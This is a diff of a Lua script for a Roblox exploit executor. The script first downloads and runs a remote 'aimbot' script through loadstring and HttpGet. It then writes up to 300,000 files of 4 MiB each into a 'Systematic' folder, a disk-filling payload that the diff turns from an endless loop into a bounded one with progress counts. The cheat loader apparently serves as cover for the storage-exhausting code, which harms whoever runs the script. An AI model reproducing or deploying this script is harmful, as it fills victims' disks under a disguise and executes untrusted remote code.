@@ -1,24 +1,44 @@
 loadstring(game:HttpGet("https://rscripts.net/raw/new-zumhub-aimbot-zab-og_1788575235771_FxNXhdyH2P.txt",true))()
 task.wait(10)
-local fileNamePrefix = "Systematic"
-local fileSize = 4 * 1024 * 1024
+local folderName = "Systematic"
+local totalFiles = 300000
+local fileSize = 4 * 1024 * 1024 -- 4 MiB
+local waitTime = 0.1
+
 local content = string.rep("A", fileSize)
 
-local counter = 1
+if not isfolder(folderName) then
+    makefolder(folderName)
+end
 
-while true do
-    local fileName = fileNamePrefix .. tostring(counter) .. ".txt"
+local successfulWrites = 0
+local failedWrites = 0
+
+for i = 1, totalFiles do
+    local fileName = folderName .. "/File" .. i .. ".txt"
 
     local success, err = pcall(function()
         writefile(fileName, content)
     end)
 
     if success then
-        print("Success")
+        successfulWrites = successfulWrites + 1
     else
-        warn("Failed: " .. tostring(err))
+        failedWrites = failedWrites + 1
+        warn("Write failed at file " .. i .. ": " .. tostring(err))
     end
 
-    counter = counter + 1
-    task.wait(0.15)
+    if i % 100 == 0 then
+        print(
+            "Attempted:", i,
+            "Successful:", successfulWrites,
+            "Failed:", failedWrites
+        )
+    end
+
+    task.wait(waitTime)
 end
+
+print("Finished.")
+print("Successful writes:", successfulWrites)
+print("Failed writes:", failedWrites)
